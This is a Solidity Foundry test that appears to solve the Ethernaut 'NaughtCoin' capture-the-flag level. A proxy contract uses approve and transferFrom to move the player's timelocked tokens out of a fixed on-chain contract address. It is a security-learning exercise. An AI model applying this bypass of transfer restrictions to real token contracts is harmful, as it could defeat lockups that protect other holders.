// SPDX-License-Identifier: UNLICENSED

// forge test --contracts src/test/King.t.sol --fork-url $rpc -vvvv
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/console.sol";
import "forge-std/Vm.sol";
import "../NaughtCoin.sol";

contract ProxyNaughtCoin {
    NaughtCoin obj;
    
    constructor(address addr) public {
        obj = NaughtCoin(addr);
    }

    function hack(address owner) public {
        uint256 val = obj.allowance(owner, address(this));
        bool success = obj.transferFrom(owner, address(this), val);
        assert(success == true);
    }
}
contract NaughtCoinTest is DSTest {
    NaughtCoin obj;
    ProxyNaughtCoin proxy_NaughtCoin;
    Vm vm = Vm(HEVM_ADDRESS);
    address payable player_address;
    address contract_address;
    function setUp() public {
        contract_address = 0x8C8CB0f2FE4dFe4db90E21f6efC062F62774936d;
        player_address = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
        obj = NaughtCoin(contract_address);
        // obj = new NaughtCoin(player_address);
        proxy_NaughtCoin = new ProxyNaughtCoin(address(obj));
    }

    function testNaughtCoin() public {
        vm.startPrank(player_address);
        console.log("Proxy NaughtCoin Address =", address(proxy_NaughtCoin));
        console.log("Proxy NaughtCoin initial erc20 balance =", obj.balanceOf(address(proxy_NaughtCoin)));
        console.log("initial supply state =", obj.INITIAL_SUPPLY());
        uint256 player_balance = obj.balanceOf(obj.player());
        console.log("initial balance state =", player_balance);
        obj.approve(address(proxy_NaughtCoin), player_balance);
        console.log("Approved amount =", obj.allowance(player_address, address(proxy_NaughtCoin)));
        proxy_NaughtCoin.hack(player_address);
        console.log("end balance state =", obj.balanceOf(obj.player())); 
        console.log("Proxy NaughtCoin end erc20 balance =", obj.balanceOf(address(proxy_NaughtCoin)));
        assert(obj.balanceOf(player_address) == 0);
    }
}
